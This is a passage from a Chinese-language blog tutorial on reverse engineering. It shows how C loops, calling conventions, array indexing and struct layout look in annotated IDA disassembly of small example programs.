class="hljs-number">242</span>↑p<br>.text:<span class="hljs-number">0000000000401550</span>                                         ; DATA XREF: .pdata:<span class="hljs-number">000000000040506</span>C↓o<br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span> var_8           = dword ptr <span class="hljs-number">-8</span><br>.text:<span class="hljs-number">0000000000401550</span> var_4           = dword ptr <span class="hljs-number">-4</span><br>.text:<span class="hljs-number">0000000000401550</span> arg_0           = dword ptr  <span class="hljs-number">10</span>h<br>.text:<span class="hljs-number">0000000000401550</span> arg_8           = qword ptr  <span class="hljs-number">18</span>h<br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span>                 push    rbp<br>.text:<span class="hljs-number">0000000000401551</span>                 mov     rbp, rsp<br>.text:<span class="hljs-number">0000000000401554</span>                 sub     rsp, <span class="hljs-number">30</span>h<br>.text:<span class="hljs-number">0000000000401558</span>                 mov     [rbp+arg_0], ecx<br>.text:<span class="hljs-number">000000000040155B</span>                 mov     [rbp+arg_8], rdx<br>.text:<span class="hljs-number">000000000040155F</span>                 call    __main<br><span class="hljs-comment">/*赋初值</span><br><span class="hljs-comment">.text:0000000000401564                 mov     [rbp+var_4], 0  //a=0</span><br><span class="hljs-comment">.text:000000000040156B                 mov     [rbp+var_8], 0  //b=0</span><br><span class="hljs-comment">.text:0000000000401572                 mov     [rbp+var_8], 0</span><br><span class="hljs-comment">.text:0000000000401579                 jmp     short loc_401596</span><br><span class="hljs-comment">    </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    </span><br><span class="hljs-comment">.text:000000000040157B ; ---------------------------------------------------------------------------</span><br><span class="hljs-comment">.text:000000000040157B</span><br><span class="hljs-comment"> */</span>  <br> <br>.text:<span class="hljs-number">000000000040157B</span> loc_40157B:                             ; CODE XREF: main+<span class="hljs-number">4</span>A↓j<br>.text:<span class="hljs-number">000000000040157B</span>                 mov     eax, [rbp+var_4]  <span class="hljs-comment">//eax=a</span><br>.text:<span class="hljs-number">000000000040157</span>E                 mov     edx, eax  <span class="hljs-comment">//edx=a</span><br>.text:<span class="hljs-number">0000000000401580</span>                 lea     rcx, Format     ; <span class="hljs-string">&quot;%d&quot;</span><br>.text:<span class="hljs-number">0000000000401587</span>                 call    <span class="hljs-built_in">printf</span>   <span class="hljs-comment">//输出a</span><br>.text:<span class="hljs-number">000000000040158</span>C                 mov     eax, [rbp+var_8]  <span class="hljs-comment">//eax=b</span><br>.text:<span class="hljs-number">000000000040158F</span>                 add     [rbp+var_4], eax  <span class="hljs-comment">//a+=b   </span><br>.text:<span class="hljs-number">0000000000401592</span>                 add     [rbp+var_8], <span class="hljs-number">1</span> <span class="hljs-comment">//b+=1  步长</span><br>.text:<span class="hljs-number">0000000000401596</span><br>.text:<span class="hljs-number">0000000000401596</span> loc_401596:                             ; CODE XREF: main+<span class="hljs-number">29</span>↑j<br>    <span class="hljs-comment">//比较</span><br>.text:<span class="hljs-number">0000000000401596</span>                 cmp     [rbp+var_8], <span class="hljs-number">63</span>h ; <span class="hljs-string">&#x27;c&#x27;</span>  <span class="hljs-comment">//99</span><br>.text:<span class="hljs-number">000000000040159</span>A                 jle     <span class="hljs-keyword">short</span> loc_40157B   <span class="hljs-comment">// </span><br>.text:<span class="hljs-number">000000000040159</span>C                 mov     eax, [rbp+arg_0]<br>.text:<span class="hljs-number">000000000040159F</span>                 add     rsp, <span class="hljs-number">30</span>h<br>.text:<span class="hljs-number">00000000004015</span>A3                 pop     rbp<br>.text:<span class="hljs-number">00000000004015</span>A4                 retn<br>.text:<span class="hljs-number">00000000004015</span>A4 main            endp<br></code></pre></td></tr></table></figure><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="三种调用方式"><a href="#三种调用方式" class="headerlink" title="三种调用方式"></a>三种调用方式</h3><h4 id="cdel-调用方平衡堆栈"><a href="#cdel-调用方平衡堆栈" class="headerlink" title="__cdel 调用方平衡堆栈"></a>__cdel 调用方平衡堆栈</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">MyAdd</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a,<span class="hljs-keyword">int</span> b)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> a + b;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    MyAdd(<span class="hljs-number">3</span>,<span class="hljs-number">4</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>优点：可以用于可变参数函数（因为可变参数情况下，我传几个参数我是知道的，自己 传自己删<br>缺点：增加了代码长度，调用几次子函数，就要多几次栈平衡操作</p><p>解释：这里main函数对add产生调用，main属于调用方，所以在main函数这里平衡堆栈</p><p>即 在 call 子函数 之后 add 开辟空间</p><h4 id="stdcall-被调方平衡堆栈"><a href="#stdcall-被调方平衡堆栈" class="headerlink" title="__stdcall 被调方平衡堆栈"></a>__stdcall 被调方平衡堆栈</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function">__int64 __stdcall <span class="hljs-title">MyAdd</span><span class="hljs-params">(<span class="hljs-keyword">float</span> a,<span class="hljs-keyword">double</span> b,<span class="hljs-keyword">int</span> c)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> a + b + c;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    MyAdd(<span class="hljs-number">3.0f</span>,<span class="hljs-number">4.0f</span>,<span class="hljs-number">6</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>优点：节省代码长度 缺点：不支持可变参数（因为子函数是可重复使用的代码块，这段代码块一定是死的，<br>是不能再改变的，所以如果希望子函数平衡栈，那么它的参数个数必须确定）</p><p>解释：这里main函数对add产生调用，add函数属于被调用方，所以在add函数这里平衡堆栈</p><p>即 在 call 子函数 之前 add 开辟空间</p><h4 id="fastcall-stdcallfast版"><a href="#fastcall-stdcallfast版" class="headerlink" title="__fastcall stdcallfast版"></a>__fastcall stdcallfast版</h4><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><p>​    特征：连续几次赋值类型相同，且赋值的目的地址是从低到高的。 而连续定义的局部变量其赋值地址是从高到低的。 而全局数组和静态数组看上去就和连续定义同类项变量没有区别<br>​    字符串：是以’\0’结尾的char数组</p><p>​    字符串赋初值时，不是一个char一个char复制的，而是优先4字节，再2字节，最后1字节 （4-2-1）<br>​    作为参数传递：数组作为参数传递会退化为指针，因此数组参数实际上是指针，此时不能使用 sizeof获取其长度<br>​    作为返回值：禁止！局部数组的生命周期在函数返回时就结束了，因此返回的内容将不确定 可以使用全局数组、静态数组、作为参数传入的数组 静态数组作为一个整体，只占一个代表初始化的标志位（好像 多维数组的存储方式：展成一维（多维数组是C语言概念，不是汇编的概念） 转成汇编后，常量下标和一维情况完全没有区别，如[ebp+1C];<br>​    数组寻址方式 数组名和指针的区别：指针访问元素的效率比数组名要低：原因是指针是个变量，使用时要 先访问这个变量的内容（数组的首地址），再偏移（两次寻址）；而数组名自身就是常值， 直接偏移即可（一次寻址） 一维数组下：<br>​    下标是常量：编译直接计算出地址 下标是变量：先取变量，再计算偏移 下标是表达式：看复杂程度，其余同上<br>​    二维数组：<br>​        两维都是常量：编辑直接计算出地址 有一维是常量：取一次变量，之后直接计算地址<br>​        两维都是变量：取第一个变量，计算出第二维的首地址；取第二个变量，结合计算出的 首地址，求出该元素的偏移<br>​    多维数组：类推</p><h3 id="一维数组"><a href="#一维数组" class="headerlink" title="一维数组"></a>一维数组</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> Ary[<span class="hljs-number">3</span>] = &#123;<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>&#125;;<br>    <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;i);<br><br>    Ary[i] = <span class="hljs-number">3</span>;  <span class="hljs-comment">//这句话会产生数组寻址公式</span><br>    <span class="hljs-keyword">return</span> Ary[i];<br>&#125;<br></code></pre></td></tr></table></figure><p>反汇编</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c">text:<span class="hljs-number">0000000000401550</span> ; <span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function">.text:0000000000401550                 <span class="hljs-keyword">public</span> main</span><br><span class="hljs-function">.text:0000000000401550 main            proc near               </span>; CODE XREF: __tmainCRTStartup+<span class="hljs-number">242</span>↑p<br>.text:<span class="hljs-number">0000000000401550</span>                                         ; DATA XREF: .pdata:<span class="hljs-number">000000000040506</span>C↓o<br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span> var_10          = dword ptr <span class="hljs-number">-10</span>h<br>.text:<span class="hljs-number">0000000000401550</span> var_C           = dword ptr <span class="hljs-number">-0</span>Ch<br>.text:<span class="hljs-number">0000000000401550</span> var_8           = dword ptr <span class="hljs-number">-8</span><br>.text:<span class="hljs-number">0000000000401550</span> var_4           = dword ptr <span class="hljs-number">-4</span><br>.text:<span class="hljs-number">0000000000401550</span> arg_0           = dword ptr  <span class="hljs-number">10</span>h<br>.text:<span class="hljs-number">0000000000401550</span> arg_8           = qword ptr  <span class="hljs-number">18</span>h<br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span>                 push    rbp<br>.text:<span class="hljs-number">0000000000401551</span>                 mov     rbp, rsp<br>.text:<span class="hljs-number">0000000000401554</span>                 sub     rsp, <span class="hljs-number">30</span>h<br>.text:<span class="hljs-number">0000000000401558</span>                 mov     [rbp+arg_0], ecx<br>.text:<span class="hljs-number">000000000040155B</span>                 mov     [rbp+arg_8], rdx<br>.text:<span class="hljs-number">000000000040155F</span>                 call    __main<br>.text:<span class="hljs-number">0000000000401564</span>                 mov     [rbp+var_C], <span class="hljs-number">0</span>  <span class="hljs-comment">//a[0]=0</span><br>.text:<span class="hljs-number">000000000040156B</span>                 mov     [rbp+var_8], <span class="hljs-number">1</span>  <span class="hljs-comment">//a[1]=1</span><br>.text:<span class="hljs-number">0000000000401572</span>                 mov     [rbp+var_4], <span class="hljs-number">2</span>  <span class="hljs-comment">//a[2]=2</span><br>.text:<span class="hljs-number">0000000000401579</span>                 mov     [rbp+var_10], <span class="hljs-number">0</span>  <span class="hljs-comment">//a=0</span><br>.text:<span class="hljs-number">0000000000401580</span>                 lea     rax, [rbp+var_10] <br>.text:<span class="hljs-number">0000000000401584</span>                 mov     rdx, rax<br>.text:<span class="hljs-number">0000000000401587</span>                 lea     rcx, Format     ; <span class="hljs-string">&quot;%d&quot;</span> <span class="hljs-comment">//scanf(&quot;&quot;);</span><br>.text:<span class="hljs-number">000000000040158</span>E                 call    <span class="hljs-built_in">scanf</span><br>.text:<span class="hljs-number">0000000000401593</span>                 mov     eax, [rbp+var_10]<br>.text:<span class="hljs-number">0000000000401596</span>                 cdqe<br>.text:<span class="hljs-number">0000000000401598</span>                 mov     [rbp+rax*<span class="hljs-number">4</span>+var_C], <span class="hljs-number">3</span> <span class="hljs-comment">//a[]</span><br>.text:<span class="hljs-number">00000000004015</span>A0                 mov     eax, [rbp+var_10]<br>.text:<span class="hljs-number">00000000004015</span>A3                 cdqe<br>.text:<span class="hljs-number">00000000004015</span>A5                 mov     eax, [rbp+rax*<span class="hljs-number">4</span>+var_C]<br>.text:<span class="hljs-number">00000000004015</span>A9                 add     rsp, <span class="hljs-number">30</span>h<br>.text:<span class="hljs-number">00000000004015</span>AD                 pop     rbp<br>.text:<span class="hljs-number">00000000004015</span>AE                 retn<br>.text:<span class="hljs-number">00000000004015</span>AE main            endp<br></code></pre></td></tr></table></figure><h3 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> Ary[<span class="hljs-number">2</span>][<span class="hljs-number">3</span>][<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> k = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d%d%d&quot;</span>,&amp;i,&amp;j,&amp;k);<br><br>    Ary[i][j][k] = <span class="hljs-number">9</span>;  <span class="hljs-comment">//会产生数组寻址公式</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>反汇编</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c">.text:<span class="hljs-number">0000000000401550</span> ; <span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function">.text:0000000000401550                 <span class="hljs-keyword">public</span> main</span><br><span class="hljs-function">.text:0000000000401550 main            proc near               </span>; CODE XREF: __tmainCRTStartup+<span class="hljs-number">242</span>↑p<br>.text:<span class="hljs-number">0000000000401550</span>                                         ; DATA XREF: .pdata:<span class="hljs-number">000000000040506</span>C↓o<br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span> var_7C          = dword ptr <span class="hljs-number">-7</span>Ch<br>.text:<span class="hljs-number">0000000000401550</span> var_78          = dword ptr <span class="hljs-number">-78</span>h<br>.text:<span class="hljs-number">0000000000401550</span> var_74          = dword ptr <span class="hljs-number">-74</span>h<br>.text:<span class="hljs-number">0000000000401550</span> var_70          = dword ptr <span class="hljs-number">-70</span>h<br>.text:<span class="hljs-number">0000000000401550</span> arg_0           = dword ptr  <span class="hljs-number">10</span>h<br>.text:<span class="hljs-number">0000000000401550</span> arg_8           = qword ptr  <span class="hljs-number">18</span>h<br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span>                 push    rbp<br>.text:<span class="hljs-number">0000000000401551</span>                 push    rdi<br>.text:<span class="hljs-number">0000000000401552</span>                 sub     rsp, <span class="hljs-number">98</span>h<br>.text:<span class="hljs-number">0000000000401559</span>                 lea     rbp, [rsp+<span class="hljs-number">80</span>h]<br>.text:<span class="hljs-number">0000000000401561</span>                 mov     [rbp+<span class="hljs-number">20</span>h+arg_0], ecx<br>.text:<span class="hljs-number">0000000000401564</span>                 mov     [rbp+<span class="hljs-number">20</span>h+arg_8], rdx<br>.text:<span class="hljs-number">0000000000401568</span>                 call    __main<br>.text:<span class="hljs-number">000000000040156</span>D                 lea     rdx, [rbp+<span class="hljs-number">20</span>h+var_70] <br>.text:<span class="hljs-number">0000000000401571</span>                 mov     eax, <span class="hljs-number">0</span><br>.text:<span class="hljs-number">0000000000401576</span>                 mov     ecx, <span class="hljs-number">0</span>Ch<br>.text:<span class="hljs-number">000000000040157B</span>                 mov     rdi, rdx<br>.text:<span class="hljs-number">000000000040157</span>E                 rep stosq<br>.text:<span class="hljs-number">0000000000401581</span>                 mov     [rbp+<span class="hljs-number">20</span>h+var_74], <span class="hljs-number">0</span>  <br>.text:<span class="hljs-number">0000000000401588</span>                 mov     [rbp+<span class="hljs-number">20</span>h+var_78], <span class="hljs-number">0</span><br>.text:<span class="hljs-number">000000000040158F</span>                 mov     [rbp+<span class="hljs-number">20</span>h+var_7C], <span class="hljs-number">0</span><br>.text:<span class="hljs-number">0000000000401596</span>                 lea     rcx, [rbp+<span class="hljs-number">20</span>h+var_7C]<br>.text:<span class="hljs-number">000000000040159</span>A                 lea     rdx, [rbp+<span class="hljs-number">20</span>h+var_78]<br>.text:<span class="hljs-number">000000000040159</span>E                 lea     rax, [rbp+<span class="hljs-number">20</span>h+var_74]<br>.text:<span class="hljs-number">00000000004015</span>A2                 mov     r9, rcx<br>.text:<span class="hljs-number">00000000004015</span>A5                 mov     r8, rdx<br>.text:<span class="hljs-number">00000000004015</span>A8                 mov     rdx, rax<br>.text:<span class="hljs-number">00000000004015</span>AB                 lea     rcx, Format     ; <span class="hljs-string">&quot;%d%d%d&quot;</span>  <span class="hljs-comment">//读取三维数组</span><br>.text:<span class="hljs-number">00000000004015B</span>2                 call    <span class="hljs-built_in">scanf</span><br>.text:<span class="hljs-number">00000000004015B</span>7                 mov     edx, [rbp+<span class="hljs-number">20</span>h+var_74]<br>.text:<span class="hljs-number">00000000004015B</span>A                 mov     eax, [rbp+<span class="hljs-number">20</span>h+var_78]<br>.text:<span class="hljs-number">00000000004015B</span>D                 mov     ecx, [rbp+<span class="hljs-number">20</span>h+var_7C]<br>.text:<span class="hljs-number">00000000004015</span>C0                 movsxd  rcx, ecx<br>.text:<span class="hljs-number">00000000004015</span>C3                 movsxd  rdx, edx<br>.text:<span class="hljs-number">00000000004015</span>C6                 movsxd  r8, eax<br>.text:<span class="hljs-number">00000000004015</span>C9                 mov     rax, rdx<br>.text:<span class="hljs-number">00000000004015</span>CC                 add     rax, rax<br>.text:<span class="hljs-number">00000000004015</span>CF                 add     rax, rdx<br>.text:<span class="hljs-number">00000000004015</span>D2                 add     rax, r8<br>.text:<span class="hljs-number">00000000004015</span>D5                 shl     rax, <span class="hljs-number">2</span><br>.text:<span class="hljs-number">00000000004015</span>D9                 add     rax, rcx<br>.text:<span class="hljs-number">00000000004015</span>DC                 mov     [rbp+rax*<span class="hljs-number">4</span>+<span class="hljs-number">20</span>h+var_70], <span class="hljs-number">9</span><br>.text:<span class="hljs-number">00000000004015E4</span>                 mov     eax, <span class="hljs-number">0</span><br>.text:<span class="hljs-number">00000000004015E9</span>                 add     rsp, <span class="hljs-number">98</span>h<br>.text:<span class="hljs-number">00000000004015F</span>0                 pop     rdi<br>.text:<span class="hljs-number">00000000004015F</span>1                 pop     rbp<br>.text:<span class="hljs-number">00000000004015F</span>2                 retn<br>.text:<span class="hljs-number">00000000004015F</span>2 main            endp<br></code></pre></td></tr></table></figure><p>公式先贴出来:</p><p>　　<strong>Ary + sizeof(type[C][H]) * i + sizeof(type[H])*j + sizeof(type)*k</strong></p><p> 代入公式看汇编</p><p>　　1.eax &#x3D; i的值</p><p>  　　2. eax * 30 ,相当于求 sizeof(type[C][H]) * i</p><p>　　3.求出数组首地址+eax,也就是求出了 Ary[M]的位置,给Ecx赋值</p><p>　　4.求出j的值</p><p>　　5.左移4位,相当于2^4次方也就是16 这一步相当于求 sizeof(type[H])的值</p><p>　　6.ary[M] + sizeof(type[H])的值得出了 ary[M][C]的值</p><p>　　7.求出k的值</p><p>　　8.数组寻址公式 ary[M][C]的值 + 4 * k的值.</p><h2 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">TagList</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">char</span> ch;<br>    <span class="hljs-keyword">int</span>  number1;<br>    <span class="hljs-keyword">short</span> <span class="hljs-keyword">int</span> number2;<br>    <span class="hljs-keyword">double</span> dbl;<br>    <span class="hljs-keyword">float</span> flt;<br>&#125;;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">TagList</span> <span class="hljs-title">t1</span>=</span>&#123;<br>    <span class="hljs-string">&#x27;a&#x27;</span>,<br>    <span class="hljs-number">1</span>,<br>    <span class="hljs-number">2</span>,<br>    <span class="hljs-number">3.14</span>,<br>    <span class="hljs-number">0.0</span>    <br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,<span class="hljs-keyword">sizeof</span>(t1));<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>对应反汇编</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401550</span> <span class="hljs-comment">; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401550</span>                 <span class="hljs-meta">public</span> main<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401550</span> main            proc <span class="hljs-built_in">near</span>               <span class="hljs-comment">; CODE XREF: __tmainCRTStartup+242↑p</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401550</span>                                         <span class="hljs-comment">; DATA XREF: .pdata:000000000040506C↓o</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401550</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401550</span> var_20          = <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> -<span class="hljs-number">20h</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401550</span> var_1C          = <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> -<span class="hljs-number">1Ch</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401550</span> var_18          = <span class="hljs-built_in">word</span> <span class="hljs-built_in">ptr</span> -<span class="hljs-number">18h</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401550</span> var_10          = <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> -<span class="hljs-number">10h</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401550</span> var_8           = <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> -<span class="hljs-number">8</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401550</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401550</span>                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">rbp</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401551</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rbp</span>, <span class="hljs-built_in">rsp</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401554</span>                 <span class="hljs-keyword">sub</span>     <span class="hljs-built_in">rsp</span>, <span class="hljs-number">40h</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401558</span>                 <span class="hljs-keyword">call</span>    __main<br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000040155D</span>                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">rbp</span>+var_20], <span class="hljs-number">61h</span> <span class="hljs-comment">; &#x27;a&#x27;</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401561</span>                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">rbp</span>+var_1C], <span class="hljs-number">1</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401568</span>                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">rbp</span>+var_18], <span class="hljs-number">2</span><br><span class="hljs-symbol">.text:</span>000000000040156E                 <span class="hljs-keyword">movsd</span>   <span class="hljs-built_in">xmm0</span>, <span class="hljs-built_in">cs</span>:qword_404008<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401576</span>                 <span class="hljs-keyword">movsd</span>   [<span class="hljs-built_in">rbp</span>+var_10], <span class="hljs-built_in">xmm0</span><br><span 